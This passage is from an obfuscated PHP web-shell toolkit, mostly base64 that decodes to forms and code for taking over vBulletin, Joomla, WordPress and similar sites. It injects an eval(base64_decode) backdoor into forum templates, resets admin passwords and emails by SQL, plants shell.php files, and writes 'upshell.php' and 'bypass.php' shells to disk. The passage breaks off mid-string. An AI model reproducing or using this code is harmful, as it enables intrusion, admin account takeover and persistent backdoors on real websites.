WWE5sY2lCaFpHMXBianhpY2o0OEwyWnZiblErUEdsdWNIVjBJSFpoYkhWbFBYSnZiM1FnZEhsd1pUMTBaWGgwSUc1aGJXVTlkWE5sY2lCemFYcGxQU2MxTUNjZ2MzUjViR1U5SjJadmJuUXRjMmw2WlRvZ09IQjBPeUJqYjJ4dmNqb2dJekF3TURBd01Ec2dabTl1ZEMxbVlXMXBiSGs2SUZSaGFHOXRZVHNnWW05eVpHVnlPaUF4Y0hnZ2MyOXNhV1FnSXpZMk5qWTJOanNnWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSTBaR1JrWkdSaWMrUEdKeVBnbzhabTl1ZENCbVlXTmxQU2RCY21saGJDY2dZMjlzYjNJOUp5TXdNREF3TURBblBrNWxkeUJ3WVhOeklHRmtiV2x1UEdKeVBqd3ZabTl1ZEQ0OGFXNXdkWFFnZG1Gc2RXVTlNVEl6TkRVMklIUjVjR1U5ZEdWNGRDQnVZVzFsUFhCaGMzTWdjMmw2WlQwbk5UQW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZERzZ1kyOXNiM0k2SUNNd01EQXdNREE3SUdadmJuUXRabUZ0YVd4NU9pQlVZV2h2YldFN0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lDTTJOalkyTmpZN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklDTkdSa1pHUmtZblBqeGljajRLUEdadmJuUWdabUZqWlQwblFYSnBZV3duSUdOdmJHOXlQU2NqTURBd01EQXdKejVPWlhjZ1JTMXRZV2xzSUdGa2JXbHVQR0p5UGp3dlptOXVkRDQ4YVc1d2RYUWdkbUZzZFdVOWEzbHRiR3B1YTBCNVlXaHZieTVqYjIwZ2RIbHdaVDEwWlhoMElHNWhiV1U5WlcxaGFXd2djMmw2WlQwbk5UQW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZERzZ1kyOXNiM0k2SUNNd01EQXdNREE3SUdadmJuUXRabUZ0YVd4NU9pQlVZV2h2YldFN0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lDTTJOalkyTmpZN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklDTkdSa1pHUmtZblBqeGljajRLUEdadmJuUWdabUZqWlQwblFYSnBZV3duSUdOdmJHOXlQU2NqTURBd01EQXdKejVEYjJSbElGTm9aV3hzUEdKeVBqd3ZabTl1ZEQ0OGRHVjRkR0Z5WldFZ2JtRnRaVDBpWkdGMFlTSWdZMjlzY3owaU5EQWlJSEp2ZDNNOUlqRXdJajRrYzNCaFkyVnlYMjl3Wlc0S2V5UjdaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0poVjFsdllWaE9lbHBZVVc5S1JqbFJWREZPVlZkNVpGUmtWMG9nZEdGWVVXNVlVMnR3Wlhjd1MwbERRV2RKUTFKdFlWZDRiRnBIYkhsSlJEQm5TV2xKTjBsQk1FdEpRMEZuU1VOU2RGa2dXR2h0WVZkNGJFbEVNR2RLZWtsM1RVUkJkMDFFUVc1UGR6QkxSRkZ2WjBsRFFXZEtTRlo2V2xoS2JXRlhlR3hZTWpVZ2FHSlhWV2RRVTBGcldEQmFTbFJGVmxSWGVXUndZbGRHYmxwVFpHUlhlV1IxV1ZjeGJFb3hNRGRFVVc5blNVTkJaMG9nU0ZaNldsaEtiV0ZYZUd4WU0xSjBZME5CT1VsRFVtWlNhMnhOVWxaT1lrb3liSFJaVjJSc1NqRXhZa296VW5SalJqa2dkVmxYTVd4S01UQTNSRkZ2WjBsRFFXZGhWMWxuUzBkc2VtTXlWakJMUTFKbVVtdHNUVkpXVG1KS01teDBXVmRrYkVvZ01URmlTakkxYUdKWFZXNVlVMnR3U1VoelRrTnBRV2RKUTBGblNVTkJaMHBIUm1saU1sRm5VRk5CYTFwdGJITmFWMUlnY0dOcE5HdGtXRTVzWTIxYWNHSkhWbVppYlVaMFdsUnpUa05wUVdkSlEwRm5TVU5CWjFGSE1YWmtiVlptWkZoQ2MySWdNa1pyV2xkU1pscHRiSE5hVTJkclpGaE9iR050V25CaVIxWm1aRWN4ZDB4RFFXdFpWMHAyV2tOck4wUlJiMmRKUVRBZ1MxcFhUbTlpZVVrNFdUSldkV1JIVm5sUWFuaHBVR3RTZG1KdFZXZFFWREFyU1VOU01XTXlWbmxhYld4eldsWTVkVmtnVnpGc1VFTTVhVkJxZDNaWk1sWjFaRWRXZVZCcFNUZEVVWEE1UkZGd09VUlJjR3hpU0U1c1pYY3dTMXBYVG05aWVXTWdUa05xZUcxaU0wcDBTVWN4YkdSSGFIWmFSREJwVlVVNVZGWkRTV2RaVjA0d1lWYzVkVkJUU1dsSlIxWjFXVE5TTldNZ1IxVTVTVzB4TVdKSVVuQmpSMFo1WkVNNWJXSXpTblJNVjFKb1pFZEZhVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFVMG9nYldGWGVHeEphVUoxV1ZjeGJGQlRTbkJpVjBadVdsTkpLMUJIYkhWalNGWXdTVWhTTldOSFZUbEpiRTR4V1cweGNHUWdRMGxuWW0xR2RGcFVNR2xWTTFacFlsZHNNRWxwUWpKWlYzZ3hXbFF3YVZVelZtbGlWMnd3U1dvME9Fd3lXblpqYlRBZ0swcDZjMDVEYmpBOUlpa3BmWDE3Skh0bGVHbDBLQ2w5ZlNZS0pGOXdhSEJwYm1Oc2RXUmxYMjkxZEhCMWREd3ZkR1Y0ZEdGeVpXRStQR0p5UGdvOGFXNXdkWFFnZEhsd1pUMXpkV0p0YVhRZ2RtRnNkV1U5SjBOb1lXNW5aU2NnUGp4aWNqNEtQQzltYjNKdFBqd3ZZMlZ1ZEdWeVBnbzhMMmgwYld3K0Nqdy9DbVZ5Y205eVgzSmxjRzl5ZEdsdVp5Z3dLVHNLSkdodmMzUnVZVzFsSUQwZ0pGOVFUMU5VV3lkb2IzTjBibUZ0WlNkZE93b2taR0p1WVcxbElEMGdKRjlRVDFOVVd5ZGtZbTVoYldVblhUc0tKR1JpZFhObGNpQTlJQ1JmVUU5VFZGc25aR0oxYzJWeUoxMDdDaVJrWW5CaGMzTWdQU0FrWDFCUFUxUmJKMlJpY0dGemN5ZGRPd29rZFhObGNqMXpkSEpmY21Wd2JHRmpaU2dpWENjaUxDSW5JaXdrZFhObGNpazdDaVJ6WlhSZmRYTmxjaUE5SUNSZlVFOVRWRnNuZFhObGNpZGRPd29rY0dGemN6MXpkSEpmY21Wd2JHRmpaU2dpWENjaUxDSW5JaXdrY0dGemN5azdDaVJ6WlhSZmNHRnpjeUE5SUNSZlVFOVRWRnNuY0dGemN5ZGRPd29rWlcxaGFXdzljM1J5WDNKbGNHeGhZMlVvSWx3bklpd2lKeUlzSkdWdFlXbHNLVHNLSkhObGRGOWxiV0ZwYkNBOUlDUmZVRTlUVkZzblpXMWhhV3duWFRzS0pIWmlYM0J5WldacGVDQTlJQ1JmVUU5VFZGc25jSEpsWm1sNEoxMDdDaVJrWVhSaElEMGdKRjlRVDFOVVd5ZGtZWFJoSjEwN0NpUnpaWFJmWkdGMFlTQXVQU0FvSWlSa1lYUmhJaWs3Q2lSMFlXSnNaVjl1WVcxbElEMGdKSFppWDNCeVpXWnBlQzRpZFhObGNpSTdDaVIwWVdKc1pWOXVZVzFsTWlBOUlDUjJZbDl3Y21WbWFYZ3VJblJsYlhCc1lYUmxJanNLQ2tCdGVYTnhiRjlqYjI1dVpXTjBLQ1JvYjNOMGJtRnRaU3drWkdKMWMyVnlMQ1JrWW5CaGMzTXBPd3BBYlhsemNXeGZjMlZzWldOMFgyUmlLQ1JrWW01aGJXVXBPd29LSkhGMVpYSjVJRDBnSjNObGJHVmpkQ0FxSUdaeWIyMGdKeUF1SUNSMFlXSnNaVjl1WVcxbElDNGdKeUIzYUdWeVpTQjFjMlZ5Ym1GdFpUMGlKeUF1SUNSelpYUmZkWE5sY2lBdUlDY2lPeWM3Q2lSeVpYTjFiSFFnUFNCdGVYTnhiRjl4ZFdWeWVTZ2tjWFZsY25rcE93b2tjbTkzSUQwZ2JYbHpjV3hmWm1WMFkyaGZZWEp5WVhrb0pISmxjM1ZzZENrN0NpUnpZV3gwSUQwZ0pISnZkMXNuYzJGc2RDZGRPd29rY0dGemN6RWdQU0J0WkRVb0pITmxkRjl3WVhOektUc0tKSEJoYzNNeUlEMGdiV1ExS0NSd1lYTnpNU0F1SUNSellXeDBLVHNLQ2lSeGRXVnljbmt4SUQwZ0oxVlFSRUZVUlNBbklDNGdKSFJoWW14bFgyNWhiV1VnTGlBbklGTkZWQ0J3WVhOemQyOXlaRDBpSnlBdUlDUndZWE56TWlBdUlDY2lJRmRJUlZKRklIVnpaWEp1WVcxbFBTSW5JQzRnSkhObGRGOTFjMlZ5SUM0Z0p5STdKenNLSkhGMVpYSnllVElnUFNBblZWQkVRVlJGSUNjZ0xpQWtkR0ZpYkdWZmJtRnRaU0F1SUNjZ1UwVlVJR1Z0WVdsc1BTSW5JQzRnSkhObGRGOWxiV0ZwYkNBdUlDY2lJRmRJUlZKRklIVnpaWEp1WVcxbFBTSW5JQzRnSkhObGRGOTFjMlZ5SUM0Z0p5STdKenNLSkhGMVpYSnllVE1nUFNBblZWQkVRVlJGSUNjZ0xpQWtkR0ZpYkdWZmJtRnRaVElnTGlBbklGTkZWQ0IwWlcxd2JHRjBaU0E5SWljZ0xpQWtjMlYwWDJSaGRHRWdMaUFuSWlCWFNFVlNSU0IwYVhSc1pTQTlJQ0ptWVhFaU95YzdDZ29rYjJzeFBVQnRlWE54YkY5eGRXVnllU2drY1hWbGNuSjVNU2s3Q2lSdmF6RTlRRzE1YzNGc1gzRjFaWEo1S0NSeGRXVnljbmt5S1RzS0pHOXJNVDFBYlhsemNXeGZjWFZsY25rb0pIRjFaWEp5ZVRNcE93b0thV1lvSkc5ck1TbDdDbVZqYUc4Z0lqeHpZM0pwY0hRK1lXeGxjblFvSjNaQ2RXeHNaWFJwYmlCcGJtWnZJR05vWVc1blpXUWdZVzVrSUZOb1pXeHNJR0YyWVdsc1lXSnNaU0JwY3lCbVlYRXVjR2h3SURvcEp5azdQQzl6WTNKcGNIUStJanNLZlFvL1BpQT0KJzsKCiRmaWxlID0gZm9wZW4oInZiYi5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL3ZiYi5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CgppZiAoaXNzZXQoJF9QT1NUWydqbCddKSkKewogICAgbWtkaXIoJ3Vwc2hlbGwnLCAwNzU1KTsKICAgIGNoZGlyKCd1cHNoZWxsJyk7CiRjb25maWdzaGVsbCA9ICdQR2gwYld3K1BHaGxZV1ErQ2dvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSStDZ29LUEdJK1BITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajQ4YzNCaGJpQnpkSGxzWlQwaVkyOXNiM0k2SUdKc2RXVTdJajVEdzZGamFDQXhJRG9nUEM5emNHRnVQanhpY2lBdlBncGZURzloWkNBdllXUnRhVzVwYzNSeVlYUnZjaUFtWjNRN0lFZHNiMkpoYkNCRGIyNW1hV2QxY21GMGFXOXVJQ1puZERzZ1UzbHpkR1Z5YlNBbVozUTdJRTFsWkdsaElGTmxkSFJwYm1jZ0ptZDBPeUIwYU1PcWJTREVrZUc3aTI1b0lHVGh1cUZ1WnlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGk1d2FIQThMM053WVc0K1BHSnlJQzgrQ2w5VFlYVWd4SkhEc3lCMnc2QnZJRTFsWkdsaElFMWhibUZuWlhJZ2RYQWdQSE53WVc0Z2MzUjViR1U5SW1OdmJHOXlPaUJ5WldRN0lqNXphR1ZzYkM1d2FIQThMM053WVc0K1BHSnlJQzgrQ2w5RGFPRzZvWGtnYzJobGJHdzZJRHhoSUdoeVpXWTlJbWgwZEhBNkx5OTJhV04wYVcwdmFXMWhaMlZ6TDNOb1pXeHNMbkJvY0NJZ2RHRnlaMlYwUFNKZllteGhibXNpUG1oMGRIQTZMeTkyYVdOMGFXMHZhVzFoWjJWekwzTm9aV3hzTG5Cb2NEd3ZZVDRtYm1KemNEczhMM053WVc0K1BDOWlQanhpY2lBdlBnbzhZbklnTHo0S1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK1BHSStQSE53WVc0Z2MzUjViR1U5SW1admJuUXRjMmw2WlRvZ2JHRnlaMlU3SWo1RHc2RmphQ0E4YzNCaGJpQnpkSGxzWlQwaVptOXVkQzF6YVhwbE9pQnNZWEpuWlRzaVBqSThMM053WVc0K0lEcEZaR2wwSUhSbGJYQThjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUG14bFBDOXpjR0Z1UGlCS2IyMXNZU1p1WW5Od096d3ZjM0JoYmo0OEwySStQQzl6Y0dGdVBqeGljaUF2UGdvOFlqNDhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUGtOb3c3cHVaeUIwWVNCMnc2QnZJSEJvNGJxbmJpQjBaVzF3YkdGMFpTQWdKbWQwT3lCbFpHbDBJR1BEb1drZ1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWo1cGJtUmxlQzV3YUhBOEwzTndZVzQrSURFZ1l6eHpjR0Z1SUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2SUd4aGNtZGxPeUkrdzZGcElEd3ZjM0JoYmo1MFpXMXdiR0YwWlNCaVBITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajdodXFWMElHczhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUHNPc0lDMG1aM1E3SUhOaGRtVThMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDJJK1BHSnlJQzgrQ2p4aWNpQXZQZ284WWo0OGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUJzWVhKblpUc2lQanh6Y0dGdUlITjBlV3hsUFNKbWIyNTBMWE5wZW1VNklHeGhjbWRsT3lJK1BITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajVqYUR4emNHRnVJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJR3hoY21kbE95SSs0YnFoZVNCemFHVnNiQ0IyUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2diR0Z5WjJVN0lqN2h1NXRwSUR4emNHRnVJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJR3hoY21kbE95SStjR0YwYUNCMFBITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajdodTV0cElEeHpjR0Z1SUhOMGVXeGxQU0pqYjJ4dmNqb2djbVZrT3lJK2FXNWtaWGd1Y0dod1BDOXpjR0Z1UGlBOGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUJzWVhKblpUc2lQc1NSUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2diR0Z5WjJVN0lqN0Rzend2YzNCaGJqNDhMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDNOd1lXNCtQQzl6Y0dGdVBpQThMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDJJK1BHSnlJQzgrQ2p3dmFIUnRiRDQ9Cic7CgokZmlsZSA9IGZvcGVuKCJqbC5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL2psLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsnd3AnXSkpCnsKICAgIG1rZGlyKCd1cHNoZWxsJywgMDc1NSk7CiAgICBjaGRpcigndXBzaGVsbCcpOwokY29uZmlnc2hlbGwgPSAnUEdoMGJXdytQR2hsWVdRK0NnbzhiV1YwWVNCb2RIUndMV1Z4ZFdsMlBTSkRiMjUwWlc1MExWUjVjR1VpSUdOdmJuUmxiblE5SW5SbGVIUXZhSFJ0YkRzZ1kyaGhjbk5sZEQxMWRHWXRPQ0krQ2dvS1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK1BHSStVRXhWUjBsT1V6d3ZZajQ4TDNOd1lXNCtQR0p5SUM4K0NqeGlQaVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095QXJJQ0pCUkVRZ1RrVlhJRkJNVlVkSlRpSThMMkkrUEdKeUlDOCtDanhpUGladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeUFySm01aWMzQTdJQ0pWVUV4UFFVUWlJRHh6Y0dGdUlITjBlV3hsUFNKamIyeHZjam9nY21Wa095SStRems1TGxwSlVEd3ZjM0JoYmo0OEwySStQR0p5SUM4K0NqeGlQaVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095QXJJQzlYVUMxRFQwNVVSVTVVTDFCTVZVZEpUaTlET1RrdlBITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWo1RE9Ua3VVRWhRUEM5emNHRnVQand2WWo0S1BDOW9kRzFzUGc9PQonOwoKJGZpbGUgPSBmb3Blbigid3AucGhwIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNvbmZpZ3NoZWxsKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgiYmIucGhwIiwwNzU1KTsKICAgZWNobyAiPGlmcmFtZSBzcmM9dXBzaGVsbC93cC5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CmlmIChpc3NldCgkX1BPU1RbJ3ZuJ10pKQp7CiAgICBta2RpcigndXBzaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ3Vwc2hlbGwnKTsKJGNvbmZpZ3NoZWxsID0gJ1BHaDBiV3crUEdobFlXUStDZ284YldWMFlTQm9kSFJ3TFdWeGRXbDJQU0pEYjI1MFpXNTBMVlI1Y0dVaUlHTnZiblJsYm5ROUluUmxlSFF2YUhSdGJEc2dZMmhoY25ObGREMTFkR1l0T0NJK0Nnb0tQSE53WVc0Z2MzUjViR1U5SW1OdmJHOXlPaUJpYkhWbE95SStQR0krVGxWTFJTQXpJRG84TDJJK1BDOXpjR0Z1UGp4aWNpQXZQZ284WWo0OFluSWdMejQ4TDJJK0NqeGlQa1JQVjA1TVQwRkVJREVnUThPQlNTQlVSVTFRVEVVZ1ErRzdwa0VnVGxWTFJTQXRKbWQwT3p3dllqNDhZbklnTHo0S1BHSStMU1puZERzZ1JVUkpWQ0JEVDBSRklERWdWRkpQVGtjZ1E4T0JReUJHU1V4RklNU1F3NU1nTFNabmREc2dRMGpEaUU0Z1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWo1RFQwUkZJRk5JUlV4TVBDOXpjR0Z1UGlCV3c0QlBKbTVpYzNBN1BDOWlQanhpY2lBdlBnbzhZajR0Sm1kME95QmFTVkFnVE9HNm9FazhMMkkrUEdKeUlDOCtDanhpUGkwbVozUTdJRlZRSUZSRlRWQk1SVHd2WWo0OFluSWdMejRLUEdJK0xTWm5kRHNnVTBWVVZWQThMMkkrUEdKeUlDOCtDanhpUGkwbVozUTdJRlREakUwZ1VFRlVTQ0JUU0VWTVREd3ZZajQ4WW5JZ0x6NEtQR0krUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCeVpXUTdJajQ4WW5JZ0x6NDhMM053WVc0K1BDOWlQZ284WW5JZ0x6NEtQQzlvZEcxc1BnPT0KJzsKCiRmaWxlID0gZm9wZW4oInZuLnBocCIgLCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjb25maWdzaGVsbCkpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoImJiLnBocCIsMDc1NSk7CiAgIGVjaG8gIjxpZnJhbWUgc3JjPXVwc2hlbGwvdm4ucGhwIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsKfQppZiAoaXNzZXQoJF9QT1NUWydiYiddKSkKewogICAgbWtkaXIoJ3Vwc2hlbGwnLCAwNzU1KTsKICAgIGNoZGlyKCd1cHNoZWxsJyk7CiRjb25maWdzaGVsbCA9ICdQR2gwYld3K1BHaGxZV1ErQ2dvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSStDZ29LUEdJK1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWo1UlZlRzZvazRnVE1PZElGVlRSVkl0Sm1kME95QThMM053WVc0K1BHSnlJQzgrSm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3SUNzZ0lsRlZXZUc3Z0U0Z1ZPRzZva2tnVE1PS1RpQWlQR0p5SUM4K0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0lDc2dJa05JVHlCUVNNT0pVQ0RFa0ZYRGxFa2dUZUc3bmlCUzRidVlUa2NnSWp4aWNpQXZQaVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3lBcklGUkl3NHBOSU1TUTRidUtUa2dnUk9HNm9FNUhJQ0lnVUVoUUlDSThZbklnTHo0OFluSWdMejQ4YzNCaGJpQnpkSGxzWlQwaVkyOXNiM0k2SUhKbFpEc2lQbEZWNGJxaVRpQk13NTBnUXNPQVNTQldTZUc2dmxRdEptZDBPend2YzNCaGJqNDhZbklnTHo0bWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzZ0t5QWlVVlhodXFKT0lFekRuU0JVU2VHN2hsQWdWRWxPSUZUaHVxSkpJRXpEaWs0Z0lqeGljaUF2UGladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3lBcklGVlFURTlCUkR4aWNpQXZQanhpY2lBdlBqeHpjR0Z1SUhOMGVXeGxQU0pqYjJ4dmNqb2djbVZrT3lJK1ExTkVUQ0F0Sm1kME95Qk5XVk5SVER3dmMzQmhiajQ4WW5JZ0x6NDhjM0JoYmlCemRIbHNaVDBpWTI5c2IzSTZJR0pzZFdVN0lqNXpaV3hsWTNRZ0tpQm1jbTl0SUdKdllteHZaMTkxY0d4dllXUThMM053WVc0K1BDOWlQanhpY2lBdlBnbzhZajQ4WW5JZ0x6NVV3NHhOSUZOSVJVeE1MbEJJVUR3dllqNDhZbklnTHo0S1BHSStQR0p5SUM4K1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK0ptNWljM0E3TDJGMGRHRmphRzFsYm5RdmVIaDRlSGg0ZUhOb1pXeHNMbkJvY0R3dmMzQmhiajQ4TDJJK0Nqd3ZhSFJ0YkQ0PQonOwoKJGZpbGUgPSBmb3BlbigiYmIucGhwIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNvbmZpZ3NoZWxsKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgiYmIucGhwIiwwNzU1KTsKICAgZWNobyAiPGlmcmFtZSBzcmM9dXBzaGVsbC9iYi5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9Cj8+CgoKICA8dHI+CiAgICA8dGQ+PHRhYmxlIHdpZHRoPScxMDAlJyBoZWlnaHQ9JzE3Myc+CiAgICAgIDx0cj4KICAgICAgICA8dGggY2xhc3M9J3RkJyBzdHlsZT0nYm9yZGVyLWJvdHRvbS13aWR0aDp0aGluO2JvcmRlci10b3Atd2lkdGg6dGhpbic+PGRpdiBhbGlnbj0ncmlnaHQnPjxzcGFuIGNsYXNzPSdzdHlsZTEnPlNPVVJDRSAgIDo8L3NwYW4+PC9kaXY+PC90aD4KICAgICAgICA8dGQgY2xhc3M9J3RkJyBzdHlsZT0nYm9yZGVyLWJvdHRvbS13aWR0aDp0aGluO2JvcmRlci10b3Atd2lkdGg6dGhpbic+PGZvcm0gbmFtZT0nRjEnIG1ldGhvZD0ncG9zdCc+CiAgICAgICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3ZiYicgIHZhbHVlPSdWQkInPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2psJyAgdmFsdWU9J0pvbUxhJz4KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd3cCcgIHZhbHVlPSdXb3JkUHJlc3MnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3ZuJyAgdmFsdWU9J1ZpZXROZXh0Jz4KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdiYicgIHZhbHVlPSdCby1CbG9nJz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9mb3JtPjwvdGQ+CiAgICAgIDwvdHI+CiAgIDx0cj4KICAgCjwvYm9keT4KPC9odG1sPg==
';
$file = fopen("upshell.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
   echo "<iframe src=upshell.php width=100% height=720px frameborder=0></iframe> ";
}//end upshell
elseif ($action == 'bypass') {
$file = fopen($dir."bypass.php" ,"w+");
$perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+CjxodG1sPgo8IS0tSXRzIEZpcnN0IFB1YmxpYyBWZXJzaW9uIAoKIC0tPgo8L2h0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0nQ29udGVudC1UeXBlJyBjb250ZW50PSd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnPgo8dGl0bGU+OjogQnlQYXNzIDo6IEt5bUxqbmsgOjo8L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgphIHsgCnRleHQtZGVjb3JhdGlvbjpub25lOwpjb2xvcjp3aGl0ZTsKIH0KPC9zdHlsZT4gCjxzdHlsZT4KaW5wdXQgeyAKY29sb3I6IzAwMDAzNTsgCmZvbnQ6OHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOwp9Ci5ESVIgeyAKY29sb3I6IzAwMDAzNTsgCmZvbnQ6Ym9sZCA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7Y29sb3I6I0ZGRkZGRjsKYmFja2dyb3VuZC1jb2xvcjojQUEwMDAwOwpib3JkZXItc3R5bGU6bm9uZTsKfQoudHh0IHsgCmNvbG9yOiMyQTAwMDA7IApmb250OmJvbGQgIDhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfSAKYm9keSwgdGFibGUsIHNlbGVjdCwgb3B0aW9uLCAuaW5mbwp7CmZvbnQ6Ym9sZCAgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOwp9CmJvZHkgewoJYmFja2dyb3VuZC1jb2xvcjogI0U1RTVFNTsKfQouc3R5bGUxIHtjb2xvcjogI0FBMDAwMH0KLnRkCnsKYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsKYm9yZGVyLXRvcDogMHB4Owpib3JkZXItbGV